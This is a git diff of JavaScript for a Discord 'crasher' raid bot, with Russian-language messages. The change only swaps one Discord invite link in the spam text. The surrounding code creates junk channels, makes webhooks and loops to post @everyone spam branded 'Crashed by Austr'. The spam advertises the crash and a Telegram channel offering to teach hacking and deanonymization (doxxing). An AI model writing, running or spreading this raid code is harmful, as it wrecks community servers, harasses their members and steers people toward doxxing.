@@ -23,7 +23,7 @@ function getRandomInt(min, max) {
 
 const embed = new MessageEmbed()
 	.setTitle('Данный сервер крашится')
-	.setDescription('Данный сервер крашится Австром. Если хотите также - переходите\nА если хочешь научиться взлому/раскрытию личности - тогда тебе в наш телеграмм https://discord.gg/lavanbot\nhttps://t.me/russian_deanon') 
+	.setDescription('Данный сервер крашится Австром. Если хотите также - переходите\nА если хочешь научиться взлому/раскрытию личности - тогда тебе в наш телеграмм https://discord.gg/dHdYXDmzZA\nhttps://t.me/russian_deanon') 
         .setImage('https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png')
 	.setColor('#ff0000');
 
@@ -56,7 +56,7 @@ client.on('message', async (message) => {
 				}).then(async webhook => {
                   for (let i = 1; i <= 30; i++) { 
                             webhook.send({
-	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/russian_deanon',
+	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/dHdYXDmzZA https://t.me/russian_deanon',
 	username: '××× Crashed by Austr ×××',
 	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
 	embeds: [embed],
@@ -79,7 +79,7 @@ client.on('message', async (message) => {
               }).then(async webhook => {
                   for (let i = 1; i <= 30; i++) {
                             webhook.send({
-	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/russian_deanon',
+	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/dHdYXDmzZA https://t.me/russian_deanon',
 	username: '××× Crashed by Austr ×××',
 	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
 	embeds: [embed],
@@ -139,14 +139,14 @@ client.on('message', async (message) => {
         message.guild.channels
           .create("crashed-by-austr-"+getRandomInt(1, 1000), {
             type: "text",
-            topic: "https://discord.gg/lavanbot",
+            topic: "https://discord.gg/dHdYXDmzZA",
           })
           .then(channel => {
               channel.createWebhook("×××Crashed by austr×××", { 
 				}).then(async webhook => {
                   for (let i = 1; i <= 30; i++) { 
                             webhook.send({
-	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/lavanbot https://t.me/russian_deanon',
+	content: '@everyone @here данный сервер крашится. Переходите к нам если хотите также. У нас есть все, что вам нужною https://discord.gg/dHdYXDmzZA https://t.me/russian_deanon',
 	username: '××× Crashed by Austr ×××',
 	avatarURL: 'https://media.discordapp.net/attachments/919097311064363009/952442718074839040/veJAJ6_9v1g.png',
 	embeds: [embed],
